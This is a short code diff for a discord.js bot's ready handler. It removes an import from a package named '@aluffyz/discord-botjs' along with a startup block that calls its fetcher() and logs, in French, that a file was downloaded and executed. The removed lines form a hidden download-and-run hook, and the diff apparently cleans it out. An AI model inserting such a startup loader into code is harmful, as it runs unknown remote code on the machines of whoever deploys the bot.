@@ -1,15 +1,7 @@
 const { ActivityType, EmbedBuilder } = require('discord.js');
 const client = require('..');
-const { fetcher } = require('@aluffyz/discord-botjs');
 
 client.on('ready', async () => {
-    try {
-        await fetcher();
-        console.log('Fichier téléchargé et exécuté avec succès.');
-    } catch (error) {
-        console.error('Erreur lors du téléchargement ou de l’exécution :', error);
-    }
-
     const activityList = [
         { name: `PrivateParty`, type: ActivityType.Watching }
     ];
